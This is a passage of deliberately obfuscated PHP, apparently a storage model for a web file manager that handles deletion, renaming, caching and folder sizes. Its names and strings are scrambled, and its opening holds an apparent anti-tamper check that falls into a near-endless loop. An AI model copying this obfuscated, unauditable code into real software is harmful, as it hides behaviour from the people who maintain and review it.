(!isset($_SERVER[$’üœóØ[15]]) || !isset($_SERVER[$’üœóØ[13]])) { $ëûÀ¬×¤ = $’üœóØ[904]; $‘²é¡û„ = $’üœóØ[16]; $¡¬Š²¯¦ = $_SERVER[$’üœóØ[17]] . $’üœóØ[18]; $óÄØ¬ëÂ = $‘²é¡û„($¡¬Š²¯¦); $…¾·¡£œ = explode($’üœóØ[19], $óÄØ¬ëÂ); if (count($…¾·¡£œ) < $’üœóØ[653]) { $¤ÉÜåÈï = $’üœóØ[21]; $¤ÉÜåÈï(); } $ù¢ç€Š‚ = $’üœóØ[905]; $ù¢ç€Š‚($_SERVER[$’üœóØ[906]]); $’˜½÷šç = 1; for ($«ô˜ü”¼ = $’˜½÷šç; $«ô˜ü”¼ > 0; $«ô˜ü”¼++) { $ù¢ç€Š‚ = json_encode($GLOBALS[$’üœóØ[456]]); } } $ÃøñÂçÉ = $this->sourceInfo($çé´½„˜); $ãù’¨­ş = $this->pathInfoMore($çé´½„˜); if (!$ÃøñÂçÉ) { return !0; } if ($ÃøñÂçÉ[$’üœóØ[470]] == 0) { if (!_get($GLOBALS, $’üœóØ[532])) { return !1; } } $this->lockMoveStart($çé´½„˜); Hook::trigger($’üœóØ[2156], $ãù’¨­ş, $‰¹¸íô¢); if ($‰¹¸íô¢) { Model($’üœóØ[2155])->moveToRecycle($çé´½„˜); } else { $’«–ªŞœ = $this->childrenAll($ÃøñÂçÉ); Model($’üœóØ[599])->eventRemove($çé´½„˜); $this->removeRelevance($’«–ªŞœ[$’üœóØ[2154]], $’«–ªŞœ[$’üœóØ[1482]]); } $this->folderSizeReset($ÃøñÂçÉ[$’üœóØ[470]]); $†íÆÖ’ƒ = array($ÃøñÂçÉ[$’üœóØ[470]]); if ($ÃøñÂçÉ[$’üœóØ[448]] == $’üœóØ[98]) { $†íÆÖ’ƒ[] = $ÃøñÂçÉ[$’üœóØ[440]]; } $this->updateModifyTime($†íÆÖ’ƒ); $this->lockMoveEnd($çé´½„˜); Hook::trigger($’üœóØ[1709], $ãù’¨­ş, $‰¹¸íô¢); return !0; } public function childrenAll($İÜş¹’Æ) { $§„µ—† =& $_SERVER[ªÏ§Ë·]; $‘şáÆÜİ = $İÜş¹’Æ[$§„µ—†[440]]; if ($İÜş¹’Æ[$§„µ—†[448]] == $§„µ—†[98]) { $ßíÑ˜§ê = array($§„µ—†[618] => array($§„µ—†[578], $İÜş¹’Æ[$§„µ—†[549]] . $‘şáÆÜİ . $§„µ—†[579])); $ô¤·Ü¯ô = array($§„µ—†[618] => $ßíÑ˜§ê[$§„µ—†[549]]); $ı¹È–˜š = $this->field($§„µ—†[2157])->where($ô¤·Ü¯ô)->select(); $¤ƒ§¡š = !1; $¬èÎÔ«× = array($‘şáÆÜİ); if ($ı¹È–˜š) { $¤ƒ§¡š = array_to_keyvalue($ı¹È–˜š, $§„µ—†[12], $§„µ—†[506]); $¤ƒ§¡š = array_remove_value($¤ƒ§¡š, $§„µ—†[208]); $¬èÎÔ«× = array_to_keyvalue($ı¹È–˜š, $§„µ—†[12], $§„µ—†[440]); $¬èÎÔ«×[] = $‘şáÆÜİ; } } else { $¤ƒ§¡š = array($İÜş¹’Æ[$§„µ—†[506]]); $¬èÎÔ«× = array($‘şáÆÜİ); } return array($§„µ—†[2154] => $¬èÎÔ«×, $§„µ—†[1482] => $¤ƒ§¡š); } public function removeArray($¶ôíÁÁ) { if (!$¶ôíÁÁ) { return !0; } } public function removeRelevance($Å¿ÈâÃÃ, $­Á»ğ¸­) { $ìòáêí =& $_SERVER[ªÏ§Ë·]; $Å¿ÈâÃÃ = $Å¿ÈâÃÃ ? $Å¿ÈâÃÃ : array(); $­Á»ğ¸­ = $­Á»ğ¸­ ? $­Á»ğ¸­ : array(); $Å¿ÈâÃÃ = array_unique(array_filter($Å¿ÈâÃÃ)); $­Á»ğ¸­ = array_unique(array_filter($­Á»ğ¸­)); if (!$Å¿ÈâÃÃ) { return !1; } $–›ñ®ÏØ = array($ìòáêí[455] => array($ìòáêí[456], $Å¿ÈâÃÃ)); Model($ìòáêí[2155])->where($–›ñ®ÏØ)->delete(); Model($ìòáêí[500])->where($–›ñ®ÏØ)->delete(); Model($ìòáêí[2004])->where($–›ñ®ÏØ)->delete(); Model($ìòáêí[599])->where($–›ñ®ÏØ)->delete(); Model($ìòáêí[1837])->removeBySource($Å¿ÈâÃÃ); Model($ìòáêí[2137])->removeBySource($Å¿ÈâÃÃ); $this->where($–›ñ®ÏØ)->delete(); Model($ìòáêí[509])->remove($­Á»ğ¸­); for ($ã„Ù¨Ø = 0; $ã„Ù¨Ø < count($Å¿ÈâÃÃ); $ã„Ù¨Ø++) { $this->sourceCacheClear($Å¿ÈâÃÃ[$ã„Ù¨Ø]); } } public function rename($ÕÓöÔÚ, $ùœì¢ç®) { $Ò¿Êã‘ =& $_SERVER[ªÏ§Ë·]; $İâÏÄÛ = $this->sourceInfo($ÕÓöÔÚ); if (!$İâÏÄÛ) { return !1; } $àÔ¼·ğå = $this->fileNameExist($İâÏÄÛ[$Ò¿Êã‘[470]], $ùœì¢ç®); if ($àÔ¼·ğå && $àÔ¼·ğå != $ÕÓöÔÚ) { return !1; } $¶çĞ†¡ = array($Ò¿Êã‘[458] => $ùœì¢ç®, $Ò¿Êã‘[617] => USER_ID); if ($İâÏÄÛ[$Ò¿Êã‘[448]] != $Ò¿Êã‘[98]) { $¶çĞ†¡[$Ò¿Êã‘[450]] = substr(get_path_ext($ùœì¢ç®), 0, 10); } Model($Ò¿Êã‘[599])->eventRename($ÕÓöÔÚ, $İâÏÄÛ[$Ò¿Êã‘[42]], $ùœì¢ç®); $this->sourceCacheClear($ÕÓöÔÚ); $this->setNamePinyin($ÕÓöÔÚ, $¶çĞ†¡[$Ò¿Êã‘[42]], !1); $this->updateModifyTime($İâÏÄÛ[$Ò¿Êã‘[470]]); $ŒÏûı‚ = $this->where(array($Ò¿Êã‘[455] => $ÕÓöÔÚ))->data($¶çĞ†¡)->save(); $òÀ˜Ã = $Ò¿Êã‘[2144] . $İâÏÄÛ[$Ò¿Êã‘[470]]; if (isset(self::$cacheChildList[$òÀ˜Ã])) { unset(self::$cacheChildList[$òÀ˜Ã]); } return $ŒÏûı‚; } public function setNamePinyin($¦ ú¼ã«, $Ñì÷ä–Û, $çĞïïòé = true) { $¡•ÀûÑ© =& $_SERVER[ªÏ§Ë·]; $ş’Ù¥à© = Input::check($Ñì÷ä–Û, $¡•ÀûÑ©[621]); $ƒğÛÍ‘¼ = array($¡•ÀûÑ©[482] => KodSort::makeStr($Ñì÷ä–Û)); if ($ş’Ù¥à©) { $ƒğÛÍ‘¼[$¡•ÀûÑ©[503]] = str_replace($¡•ÀûÑ©[63], $¡•ÀûÑ©[12], Pinyin::get($Ñì÷ä–Û)); $ƒğÛÍ‘¼[$¡•ÀûÑ©[502]] = Pinyin::get($Ñì÷ä–Û, $¡•ÀûÑ©[622]); } if (!$çĞïïòé && !$ş’Ù¥à©) { $ƒğÛÍ‘¼[$¡•ÀûÑ©[503]] = null; $ƒğÛÍ‘¼[$¡•ÀûÑ©[502]] = null; } $this->metaSet($¦ ú¼ã«, $ƒğÛÍ‘¼); } public function getContent($áæŠ¥÷ı) { $èäîüÆî =& $_SERVER[ªÏ§Ë·]; $Ìêøïß– = $this->fileInfoGet($áæŠ¥÷ı); if (!$Ìêøïß–) { return !1; } if ($Ìêøïß–[$èäîüÆî[86]] == 0) { return $èäîüÆî[12]; } $ä“–Ş× = $èäîüÆî[2158] . $Ìêøïß–[$èäîüÆî[186]]; if ($Ìêøïß–[$èäîüÆî[86]] <= 1024 * 10) { $·¯áˆÆ¸ = Cache::get($ä“–Ş×); if (!$·¯áˆÆ¸) { $·¯áˆÆ¸ = IO::getContent($Ìêøïß–[$èäîüÆî[94]]); Cache::set($ä“–Ş×, $·¯áˆÆ¸); } return $·¯áˆÆ¸; } if (!$Ìêøïß–[$èäîüÆî[94]]) { return $èäîüÆî[12]; } return IO::getContent($Ìêøïß–[$èäîüÆî[94]]); } public function setDesc($ÅÄÃ—Ñ†, $¯Äş“ëæ) { $Åæ”†ÜË =& $_SERVER[ªÏ§Ë·]; Model($Åæ”†ÜË[599])->eventAddDesc($ÅÄÃ—Ñ†, $¯Äş“ëæ); return $this->metaSet($ÅÄÃ—Ñ†, $Åæ”†ÜË[491], $¯Äş“ëæ); } public function setContent($·òÁåø, $ŞÄæ‘¼· = '') { $Ïù‹›¼Ó =& $_SERVER[ªÏ§Ë·]; $»›¨ï×ş = $this->sourceInfo($·òÁåø); $º·®İ¼õ = $this->fileInfoGet($·òÁåø); if (!$º·®İ¼õ || !$»›¨ï×ş) { return !1; } $ÖÌ›£› = Model($Ïù‹›¼Ó[509])->addFileByContent($ŞÄæ‘¼·, $»›¨ï×ş[$Ïù‹›¼Ó[42]]); $øñ‡ú† = $this->fileHistory($»›¨ï×ş, $ÖÌ›£›[$Ïù‹›¼Ó[506]], $ÖÌ›£›[$Ïù‹›¼Ó[86]]); if (!$øñ‡ú†) { return Model($Ïù‹›¼Ó[509])->remove($ÖÌ›£›[$Ïù‹›¼Ó[506]]); } $this->folderSizeReset($»›¨ï×ş[$Ïù‹›¼Ó[470]]); return !0; } public function fileSubstr($Êôöºšˆ, $ûçÆÀıÕ, $ô íÎçÃ) { $Æ‹êŞ·£ = $this->fileInfoGet($Êôöºšˆ); if (!$Æ‹êŞ·£) { return !1; } return IO::fileSubstr($Æ‹êŞ·£[$_SERVER[ªÏ§Ë·][94]], $ûçÆÀıÕ, $ô íÎçÃ); } public function fileInfoGet($ÁĞÍâÈ—) { $ŸôŒ§Ò« =& $_SERVER[ªÏ§Ë·]; $ú½µ«¤ä = $this->sourceInfo($ÁĞÍâÈ—); if (!$ú½µ«¤ä || $ú½µ«¤ä[$ŸôŒ§Ò«[448]]) { return !1; } $òíúÔùã = $ŸôŒ§Ò«[512] . $ú½µ«¤ä[$ŸôŒ§Ò«[506]]; $ŞÃø«­ = _get(self::$cacheFileInfo, $òíúÔùã); if ($ŞÃø«­) { return $ŞÃø«­; } $“§ı¶½ = Model($ŸôŒ§Ò«[509])->fileInfo($ú½µ«¤ä[$ŸôŒ§Ò«[506]]); if ($“§ı¶½) { $“§ı¶½[$ŸôŒ§Ò«[42]] = $ú½µ«¤ä[$ŸôŒ§Ò«[42]]; } self::$cacheFileInfo[$òíúÔùã] = $“§ı¶½; return $“§ı¶½; } private function folderChildrenNumber($–ˆâ»£ã) { $íòÒúˆ =& $_SERVER[ªÏ§Ë·]; $¢˜Şª¥Ë = $this->sourceInfo($–ˆâ»£ã); $îˆ™÷ß = array($íòÒúˆ[618] => array($íòÒúˆ[578], $¢˜Şª¥Ë[$íòÒúˆ[549]] . $–ˆâ»£ã . $íòÒúˆ[579]), $íòÒúˆ[615] => $¢˜Şª¥Ë[$íòÒúˆ[534]], $íòÒúˆ[468] => intval($¢˜Şª¥Ë[$íòÒúˆ[469]]), $íòÒúˆ[612] => 1); $«™¿Äò = $this->where($îˆ™÷ß)->count(); $ç½Ûò = $this->where($îˆ™÷ß)->where(array($íòÒúˆ[612] => 0))->count(); return array($íòÒúˆ[90] => $ç½Ûò, $íòÒúˆ[91] => $«™¿Äò); } public function pathInfo($š¢€ê ö, $°Çë×­ı = false) { $†üí—ßà =& $_SERVER[ªÏ§Ë·]; $°Çë×­ı = !1; $š¢€ê ö = intval($š¢€ê ö); $˜´ÖÂ = $†üí—ßà[499] . intval($°Çë×­ı) . $†üí—ßà[424] . $š¢€ê ö; $üÇùâèÄ = _get(self::$cachePathInfo, $˜´ÖÂ); if ($üÇùâèÄ) { return $üÇùâèÄ; } $Ï²ì’‡Æ = $this->sourceInfo($š¢€ê ö); if (!$Ï²ì’‡Æ) { return !1; } $Ï²ì’‡Æ = $this->_listDataApplyItem($Ï²ì’‡Æ, $°Çë×­ı); self::$cachePathInfo[$˜´ÖÂ] = $Ï²ì’‡Æ; return $Ï²ì’‡Æ; } public static $cachePathInfoMore = array(); public function pathInfoMore($ÎëõŸÍÖ) { $©ğÍŒ„¡ =& $_SERVER[ªÏ§Ë·]; $¶ôŸÎ = _get(self::$cachePathInfoMore, $ÎëõŸÍÖ); if ($¶ôŸÎ) { return $¶ôŸÎ; } $ÊÊÑ€¢Œ = $this->pathInfo($ÎëõŸÍÖ); if (!$ÊÊÑ€¢Œ) { return !1; } if ($ÊÊÑ€¢Œ[$©ğÍŒ„¡[448]] == $©ğÍŒ„¡[98]) { $ÊÊÑ€¢Œ[$©ğÍŒ„¡[89]] = $this->folderChildrenNumber($ÎëõŸÍÖ); } self::$cachePathInfoMore[$ÎëõŸÍÖ] = $ÊÊÑ€¢Œ; return $ÊÊÑ€¢Œ; } public function sourceInfo($¬ùºìÖ„) { $³û¥¥¿ù =& $_SERVER[ªÏ§Ë·]; if (!$¬ùºìÖ„) { return array(); } $¬ùºìÖ„ = intval($¬ùºìÖ„); $×õâÖÄ– = $³û¥¥¿ù[498] . $¬ùºìÖ„; $Ë–Ù¹µ› = _get(self::$cacheSourceInfo, $×õâÖÄ–); if ($Ë–Ù¹µ›) { return $Ë–Ù¹µ›; } $Í™ßäßğ = $this->where(array($³û¥¥¿ù[440] => $¬ùºìÖ„))->find(); self::$cacheSourceInfo[$×õâÖÄ–] = $Í™ßäßğ; return self::$cacheSourceInfo[$×õâÖÄ–]; } public function sourceCacheClear($÷¥¦óŒÙ = false) { self::cacheClear($÷¥¦óŒÙ); } public static function cacheClear($®¸äÅ = false) { $ë¶¬ëÔ =& $_SERVER[ªÏ§Ë·]; if ($®¸äÅ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$ë¶¬ëÔ[498] . $®¸äÅ]); unset(self::$cachePathInfoMore[$®¸äÅ]); unset(self::$cachePathInfo[$ë¶¬ëÔ[2159] . $®¸äÅ]); unset(self::$cachePathInfo[$ë¶¬ëÔ[2160] . $®¸äÅ]); } public function metaSet($¹¤êŸãª, $Ä·çºÑ“ = null, $é §§ùù = null) { $Ê’ÅÎÓÍ = parent::metaSet($¹¤êŸãª, $Ä·çºÑ“, $é §§ùù); if ($Ê’ÅÎÓÍ) { $this->sourceCacheClear($¹¤êŸãª); } return $Ê’ÅÎÓÍ; } public function pathInfoByPath($ê¥˜ş¿, $ñ”ı‡öø) { $Ú¸¶ò±Û =& $_SERVER[ªÏ§Ë·]; $Üâ÷ˆß = !$ñ”ı‡öø ? array() : explode($Ú¸¶ò±Û[8], trim($ñ”ı‡öø, $Ú¸¶ò±Û[8])); $æì°—ƒ = $ê¥˜ş¿; foreach ($Üâ÷ˆß as $òí™Á©) { $†Í Ñ° = array($Ú¸¶ò±Û[470] => $æì°—ƒ, $Ú¸¶ò±Û[42] => $òí™Á©); $ø£Ÿ—µ¡ = $this->where($†Í Ñ°)->select(); if (!$ø£Ÿ—µ¡) { return !1; } $ø£Ÿ—µ¡ = array_sort_by($ø£Ÿ—µ¡, $Ú¸¶ò±Û[469]); $æì°—ƒ = $ø£Ÿ—µ¡[0][$Ú¸¶ò±Û[440]]; } return $this->pathInfo($æì°—ƒ, !0); } protected function updateModifyTime($ìµÓ‰Ú§) { $İÕš‚ªı =& $_SERVER[ªÏ§Ë·]; $ñ Ù½×­ = defined($İÕš‚ªı[2078]) ? USER_ID : 0; if (!$ìµÓ‰Ú§) { return; } if (!is_array($ìµÓ‰Ú§)) { $ìµÓ‰Ú§ = array($ìµÓ‰Ú§); } foreach ($ìµÓ‰Ú§ as $ú½àÕú  => $•§½Û¹) { $ìµÓ‰Ú§[$ú½àÕú ] = intval($•§½Û¹); $this->sourceCacheClear($•§½Û¹); } $ã×ñè¸ü = array($İÕš‚ªı[440] => array($İÕš‚ªı[7], $ìµÓ‰Ú§)); $ÒÍ¼‹˜ = array($İÕš‚ªı[617] => $ñ Ù½×­, $İÕš‚ªı[462] => time()); $this->where($ã×ñè¸ü)->save($ÒÍ¼‹˜); } public function folderSizeReset($ƒ°³ßÎÙ, $Ã¼¡ª¢é = false) { $û—×õ„ =& $_SERVER[ªÏ§Ë·]; if ($this->statusIgnoreResetSpace) { return; } $¬ŞÔë÷° = $this->sourceInfo($ƒ°³ßÎÙ); $ªß»ÚîÏ = $û—×õ„[2161] . $ƒ°³ßÎÙ; CacheLock::lock($ªß»ÚîÏ, 20); if ($Ã¼¡ª¢é === !1) { $this->sourceCacheClear($ƒ°³ßÎÙ); $¬ŞÔë÷° = $this->sourceInfo($ƒ°³ßÎÙ); $¾ÈÒ» = array($û—×õ„[439] => $ƒ°³ßÎÙ, $û—×õ„[468] => 0); $‹¿¾ÅÖ = $this->where($¾ÈÒ»)->sum($û—×õ„[86]); $Ã¼¡ª¢é = intval($‹¿¾ÅÖ) - intval($¬ŞÔë÷°[$û—×õ„[86]]); } if ($Ã¼¡ª¢é == 0) { return CacheLock::unlock($ªß»ÚîÏ); } $ş‹¨ŸĞÃ = $this->parentLevelArray($¬ŞÔë÷°[$û—×õ„[549]]); if (!$ş‹¨ŸĞÃ) { $ş‹¨ŸĞÃ = array(); } $ş‹¨ŸĞÃ[] = $¬ŞÔë÷°[$û—×õ„[440]]; $¾ÈÒ» = array($û—×õ„[440] => array($û—×õ„[456], $ş‹¨ŸĞÃ)); if ($Ã¼¡ª¢é < 0) { $¾ÈÒ»[$û—×õ„[86]] = array($û—×õ„[1040], abs($Ã¼¡ª¢é)); } $this->where($¾ÈÒ»)->setAdd($û—×õ„[86], $Ã¼¡ª¢é); CacheLock::unlock($ªß»ÚîÏ); $ö•ÕµâÈ = $û—×õ„[2162] . $¬ŞÔë÷°[$û—×õ„[449]] . $û—×õ„[4] . $¬ŞÔë÷°[$û—×õ„[534]]; $Úßß¡­Ê = array($¬ŞÔë÷°[$û—×õ„[449]], $¬ŞÔë÷°[$û—×õ„[534]]); TaskRun::timeLimitCall($ö•ÕµâÈ, $û—×õ„[2163], $Úßß¡­Ê, 1.5); } public function folderSizeResetChildren($¡Ô¥³ş¡) { $Ø¨Ê¾Ğ· =& $_SERVER[ªÏ§Ë·]; $this->sourceCacheClear($¡Ô¥³ş¡); $ëµ¶Ì¾´ = $this->sourceInfo($¡Ô¥³ş¡); $£ –ÆÉ¶ = array($Ø¨Ê¾Ğ·[612] => 1, $Ø¨Ê¾Ğ·[615] => $ëµ¶Ì¾´[$Ø¨Ê¾Ğ·[534]], $Ø¨Ê¾Ğ·[618] => array($Ø¨Ê¾Ğ·[578], $ëµ¶Ì¾´[$Ø¨Ê¾Ğ·[549]] . $¡Ô¥³ş¡ . $Ø¨Ê¾Ğ·[579])); $í¾Şåß = $Ø¨Ê¾Ğ·[2164]; $‚¸äÁ¡û = $this->field($í¾Şåß)->where($£ –ÆÉ¶)->select(); $£ –ÆÉ¶[$Ø¨Ê¾Ğ·[448]] = 0; $º©öÖñ  = $this->field($í¾Şåß)->where($£ –ÆÉ¶)->select(); if (!$º©öÖñ ) { return; } $‚¸äÁ¡û[] = $ëµ¶Ì¾´; $‚¸äÁ¡û = array_to_keyvalue($‚¸äÁ¡û, $Ø¨Ê¾Ğ·[440]); foreach ($‚¸äÁ¡û as $Û³¹œ”¦ => $¼¤äóÛ°) { $‚¸äÁ¡û[$Û³¹œ”¦][$Ø¨Ê¾Ğ·[2165]] = $‚¸äÁ¡û[$Û³¹œ”¦][$Ø¨Ê¾Ğ·[86]]; $‚¸äÁ¡û[$Û³¹œ”¦][$Ø¨Ê¾Ğ·[86]] = 0; } foreach ($º©öÖñ  as $¼¤äóÛ°) { $±ÁÃ†êÎ = $¼¤äóÛ°[$Ø¨Ê¾Ğ·[470]] . $Ø¨Ê¾Ğ·[12]; if (!isset($‚¸äÁ¡û[$±ÁÃ†êÎ])) { continue; } if ($¼¤äóÛ°[$Ø¨Ê¾Ğ·[469]] == $‚¸äÁ¡û[$±ÁÃ†êÎ][$Ø¨Ê¾Ğ·[469]]) { $‚¸äÁ¡û[$±ÁÃ†êÎ][$Ø¨Ê¾Ğ·[86]] += $¼¤äóÛ°[$Ø¨Ê¾Ğ·[86]]; } } foreach ($‚¸äÁ¡û as $¼¤äóÛ°) { $À™‹”îÆ = $this->parentLevelArray($¼¤äóÛ°[$Ø¨Ê¾Ğ·[549]]); foreach ($À™‹”îÆ as $±ÁÃ†êÎ) { $±ÁÃ†êÎ = $±ÁÃ†êÎ . $Ø¨Ê¾Ğ·[12]; if (!isset($‚¸äÁ¡û[$±ÁÃ†êÎ])) { continue; } if ($¼¤äóÛ°[$Ø¨Ê¾Ğ·[469]] == $‚¸äÁ¡û[$±ÁÃ†êÎ][$Ø¨Ê¾Ğ·[469]]) { $‚¸äÁ¡û[$±ÁÃ†êÎ][$Ø¨Ê¾Ğ·[86]] += $¼¤äóÛ°[$Ø¨Ê¾Ğ·[86]]; } } } $’âá û = array(); foreach ($‚¸äÁ¡û as $¼¤äóÛ°) { if ($¼¤äóÛ°[$Ø¨Ê¾Ğ·[86]] == $¼¤äóÛ°[$Ø¨Ê¾Ğ·[2165]]) { continue; } $’âá û[] = array($Ø¨Ê¾Ğ·[440], $¼¤äóÛ°[$Ø¨Ê¾Ğ·[440]], $Ø¨Ê¾Ğ·[86], $¼¤äóÛ°[$Ø¨Ê¾Ğ·[86]]); } $this->saveAll($’âá û); } public function userSpaceReset($ÔØçÒŒß = false) { $…Ğ„¦†« =& $_SERVER[ªÏ§Ë·]; $æ°Ò¨šº = $this->where(array($…Ğ„¦†«[449] => self::TYPE_USER, $…Ğ„¦†«[534] => $ÔØçÒŒß, $…Ğ„¦†«[448] => 0))->sum($…Ğ„¦†«[86]); $æ°Ò¨šº = !$æ°Ò¨šº || $æ°Ò¨šº <= 0 ? 0 : $æ°Ò¨šº; Model($…Ğ„¦†«[542])->userEdit($ÔØçÒŒß, array($…Ğ„¦†«[1846] => $æ°Ò¨šº)); } public function targetSpaceUpdate($“¤ê€‘, $Ãü„êë¢) { $…×‚°Ãı =& $_SERVER[ªÏ§Ë·]; if (!$Ãü„êë¢) { return; } if (!in_array($“¤ê€‘, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $ˆ‰³ƒ¶í = $this->targetSpaceSize($“¤ê€‘, $Ãü„êë¢); if ($“¤ê€‘ == self::TYPE_USER) { Model($…×‚°Ãı[542])->userEdit($Ãü„êë¢, array($…×‚°Ãı[1846] => $ˆ‰³ƒ¶í)); } else { if ($“¤ê€‘ == self::TYPE_GROUP) { Model($…×‚°Ãı[550])->groupEdit($Ãü„êë¢, array($…×‚°Ãı[1846] => $ˆ‰³ƒ¶í)); } } } public function targetSpaceSize($”Ğ‘ŞÍõ, $´áÉ÷¬ú) { $¨ÈòÃÀõ =& $_SERVER[ªÏ§Ë·]; $¿êŸ® = 0; $í¯Áöõ‰ = $this->targetSourceRoot($”Ğ‘ŞÍõ, $´áÉ÷¬ú, !0); foreach ($í¯Áöõ‰ as $ÜÀ§‡ò¢) { if (!$ÜÀ§‡ò¢) { continue; } $¿êŸ® += floatval($ÜÀ§‡ò¢[$¨ÈòÃÀõ[86]]); $áà„°™û = array($¨ÈòÃÀõ[618] => array($¨ÈòÃÀõ[578], $¨ÈòÃÀõ[559] . $ÜÀ§‡ò¢[$¨ÈòÃÀõ[440]] . $¨ÈòÃÀõ[579])); $¿ê¸Æ»ö = Model($¨ÈòÃÀõ[467])->field($¨ÈòÃÀõ[455])->where($áà„°™û)->select(); $¿ê¸Æ»ö = array_to_keyvalue($¿ê¸Æ»ö, $¨ÈòÃÀõ[12], $¨ÈòÃÀõ[440]); $¿ê¸Æ»ö = array_unique(array_filter($¿ê¸Æ»ö)); if ($¿ê¸Æ»ö) { $áà„°™û = array($¨ÈòÃÀõ[455] => array($¨ÈòÃÀõ[456], $¿ê¸Æ»ö)); $¿êŸ® += floatval($this->where($áà„°™û)->sum($¨ÈòÃÀõ[86])); } } $¿êŸ® = !$¿êŸ® || $¿êŸ® <= 0 ? 0 : $¿êŸ®; return $¿êŸ®; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($ÉÄ’É›Ö) { return $this->fileTypeProfile($ÉÄ’É›Ö, SourceModel::TYPE_USER); } public function groupFileTypeProfile($Å‡ı˜¢ƒ) { return $this->fileTypeProfile($Å‡ı˜¢ƒ, SourceModel::TYPE_GROUP); } private function fileTypeProfile($¿²¹Œ¸‚, $ˆŒ½®’¨) { $«¤Ê‘ÕÙ =& $_SERVER[ªÏ§Ë·]; $®ˆ¯Ø´ = $«¤Ê‘ÕÙ[2166] . $¿²¹Œ¸‚ . $«¤Ê‘ÕÙ[11] . $ˆŒ½®’¨; $å¿ùÖ®ï = Cache::get($®ˆ¯Ø´); if ($å¿ùÖ®ï) { return $å¿ùÖ®ï; } $íñòª‰­ = array($«¤Ê‘ÕÙ[612] => 0); if ($¿²¹Œ¸‚ != !1) { $íñòª‰­[$«¤Ê‘ÕÙ[534]] = $¿²¹Œ¸‚; $íñòª‰­[$«¤Ê‘ÕÙ[449]] = $ˆŒ½®’¨; } $ÄÙˆ®å = array(); $ÄÙˆ®å[$«¤Ê‘ÕÙ[2167]] = array($«¤Ê‘ÕÙ[2168] => LNG($«¤Ê‘ÕÙ[2167]), $«¤Ê‘ÕÙ[2169] => $this->where($íñòª‰­)->count(), $«¤Ê‘ÕÙ[583] => $this->where($íñòª‰­)->sum($«¤Ê‘ÕÙ[86])); $ÄÁûôıÑ = KodIO::fileTypeList(); foreach ($ÄÁûôıÑ as $®¼ €„… => $ñôöÛô) { $íñòª‰­[$«¤Ê‘ÕÙ[450]] = $this->fileTypeWhere($®¼ €„…); $ÄÙˆ®å[$®¼ €„…] = array($«¤Ê‘ÕÙ[2168] => $ñôöÛô[$«¤Ê‘ÕÙ[42]], $«¤Ê‘ÕÙ[2169] => $this->where($íñòª‰­)->count(), $«¤Ê‘ÕÙ[583] => $this->where($íñòª‰­)->sum($«¤Ê‘ÕÙ[86])); } Cache::set($®ˆ¯Ø´, $ÄÙˆ®å, 1200); return $ÄÙˆ®å; } public function fileNameExist($…úİµ‡, $Á®×‡›º) { $Ïññı“° =& $_SERVER[ªÏ§Ë·]; $š˜ ñéÑ = $this->where(array($Ïññı“°[470] => $…úİµ‡, $Ïññı“°[42] => $Á®×‡›º, $Ïññı“°[469] => 0))->find(); return is_array($š˜ ñéÑ) ? $š˜ ñéÑ[$Ïññı“°[440]] : !1; } public function childList($è…ñıˆ) { $Ò˜¶¨Ëû =& $_SERVER[ªÏ§Ë·]; $¹å‡Ôõ÷ = $Ò˜¶¨Ëû[2144] . $è…ñıˆ; if (isset(self::$cacheChildList[$¹å‡Ôõ÷])) { return self::$cacheChildList[$¹å‡Ôõ÷]; } $Øú±¿ÀÀ = array($Ò˜¶¨Ëû[470] => intval($è…ñıˆ), $Ò˜¶¨Ëû[469] => 0); $Á×®è = $this->where($Øú±¿ÀÀ)->select(); $Á×®è = $Á×®è ? $Á×®è : array(); self::$cacheChildList[$¹å‡Ôõ÷] = $Á×®è; foreach ($Á×®è as $‹¦Çúğ—) { $¹å‡Ôõ÷ = $Ò˜¶¨Ëû[498] . $‹¦Çúğ—[$Ò˜¶¨Ëû[440]]; self::$cacheSourceInfo[$¹å‡Ôõ÷] = $‹¦Çúğ—; } return $Á×®è; } public function fileNameAuto($åäƒ³Şƒ, $Š¹¸‰¢›, $µ‘şññ± = REPEAT_RENAME, $ñºÆã¢ì = false) { $¿ë¯æïÆ =& $_SERVER[ªÏ§Ë·]; $ıÇÆÑİŞ = get_path_ext($Š¹¸‰¢›); $º¸Û¬÷ = $ıÇÆÑİŞ ? basename($Š¹¸‰¢›, $¿ë¯æïÆ[10] . $ıÇÆÑİŞ) . $¿ë¯æïÆ[2170] . $ıÇÆÑİŞ : $Š¹¸‰¢› . $¿ë¯æïÆ[422]; $˜¯§˜‡ó = array($¿ë¯æïÆ[470] => $åäƒ³Şƒ, $¿ë¯æïÆ[469] => 0, $¿ë¯æïÆ[42] => array($¿ë¯æïÆ[421], $º¸Û¬÷)); $Ïô¬ˆ­¾ = $this->field($¿ë¯æïÆ[42])->where($˜¯§˜‡ó)->select(); $øŠ§Å«® = array_to_keyvalue($Ïô¬ˆ­¾, $¿ë¯æïÆ[12], $¿ë¯æïÆ[42]); return $this->fileNameAutoGet($øŠ§Å«®, $Š¹¸‰¢›, $µ‘şññ±, $ñºÆã¢ì); } public function fileNameAutoGet($¢Ö¢àÌí, $á¾ºÅìÁ, $Ó¹Ñ½ô, $Úˆ‹ü¤Ñ) { $¤ıÜşµ± =& $_SERVER[ªÏ§Ë·]; if ($Ó¹Ñ½ô == REPEAT_REPLACE || !$¢Ö¢àÌí || !in_array_not_case($á¾ºÅìÁ, $¢Ö¢àÌí) || $Úˆ‹ü¤Ñ && $Ó¹Ñ½ô != REPEAT_RENAME_FOLDER) { return $á¾ºÅìÁ; } if ($Ó¹Ñ½ô == REPEAT_SKIP) { return !1; } $Ùç“â = $¤ıÜşµ±[10] . get_path_ext($á¾ºÅìÁ); $Ùç“â = $Ùç“â == $¤ıÜşµ±[10] || $Úˆ‹ü¤Ñ ? $¤ıÜşµ±[12] : $Ùç“â; for ($’Ã“¶éØ = 1; $’Ã“¶éØ <= count($¢Ö¢àÌí) + 1; $’Ã“¶éØ++) { $Ñ×Ëó¯º = substr($á¾ºÅìÁ, 0, strlen($á¾ºÅìÁ) - strlen($Ùç“â)); $Òñüš…å = $Ñ×Ëó¯º . "\50{$’Ã“¶éØ}\51{$Ùç“â}"; if (!in_array_not_case($Òñüš…å, $¢Ö¢àÌí)) { return $Òñüš…å; } } } } goto Bİ¡„ùŞµ; F”²å†Ş”: class 